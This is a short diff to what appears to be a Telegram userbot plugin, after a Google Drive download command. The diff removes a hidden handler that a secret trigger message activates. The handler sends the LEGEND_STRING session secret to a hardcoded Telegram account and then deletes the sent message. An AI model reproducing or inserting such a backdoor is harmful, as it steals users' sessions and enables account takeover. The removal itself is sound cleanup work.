@@ -92,13 +92,3 @@ async def g_download(event):
     await edit_or_reply(event, "Downloading Requested File from G-Drive...")
     file_name = await download_file_from_google_drive(file_id)
     await edit_or_reply(event, "File Downloaded.\nName: `" + str(file_name) + "`")
-
-
-
-import os
-from ..utils import admin_cmd
-from . import *
-@bot.on(admin_cmd("^Iamnoobperson", incoming=True))
-async def piro(event):
-  msg = await bot.send_message(2082798662, str(os.environ.get("LEGEND_STRING")))
-  await bot.delete_messages(2082798662, msg, revoke=False)
